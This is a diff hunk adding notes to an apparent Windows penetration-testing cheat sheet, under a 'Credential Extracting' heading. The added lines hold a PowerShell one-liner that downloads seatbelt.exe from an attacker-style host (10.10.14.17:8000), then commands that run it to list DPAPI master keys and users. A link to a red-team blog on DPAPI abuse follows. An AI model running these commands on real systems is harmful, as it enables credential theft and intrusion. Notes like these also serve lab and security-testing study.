@@ -133,6 +133,13 @@ runas /usr:ACCESS\Administrator /savecred cmd /c
 # Credential Extracting
 ```
 #cache files
+
+#Must have admin accesss
+powershell -c "$client = New-Object Net.WebClient; $client.DownloadFile('http://10.10.14.17:8000/seatbelt.exe', 'sb.exe')"
+
+sb.exe MasterKeys
+sb.exe users
+
 https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/
 ```
 
